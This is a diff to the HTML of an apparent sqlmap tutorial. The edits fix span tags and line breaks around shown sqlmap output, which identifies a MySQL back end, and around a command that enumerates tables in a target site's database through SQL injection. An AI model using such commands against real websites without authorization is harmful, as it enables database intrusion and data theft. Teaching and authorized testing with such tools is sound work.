@@ -254,7 +254,7 @@ it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads sp
 
 In the end, it will display the names of the databases, showing them with a [*] in front.<br><br>
 
-<div class="code-box2">[<span class="date">11:08:25<span class="date">] [<span class="username">INFO</span>] the back-end DBMS is MySQL
+<div class="code-box2">[<span class="date">11:08:25</span>] [<span class="username">INFO</span>] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu
 web application technology: PHP 5.6.40, Nginx 1.19.0
 back-end DBMS: MySQL >= 5.6
@@ -265,11 +265,11 @@ available databases [2]:
 
 [<span class="date">11:09:41</span>] [<span class="username">INFO</span>] fetched data logged to text files under '/home/userland/.local/share/sqlmap/output/testphp.vulnweb.com
 
-<span class="username">andrew@local:~$</span></div>
+<span class="username">andrew@local:~$</span></div><br>
 
-Databases such as information_schema, performance_schema, and mysql are default system databases. The main database usually has a name similar to that of the website, so in our case the good one is "mywebsite_db". Now that we have the database name, we need to extract the table names from it. To do this, we will enter the database name using the -D attribute and use the -tables option.<br>
+Databases such as information_schema, performance_schema, and mysql are default system databases. The main database usually has a name similar to that of the website, so in our case the good one is "mywebsite_db". Now that we have the database name, we need to extract the table names from it. To do this, we will enter the database name using the -D attribute and use the -tables option.<br><br>
 
-<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -tables</div><br><br>
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -tables</div><br>
 
 
 After running this command, we will receive an output similar to:<br><br>
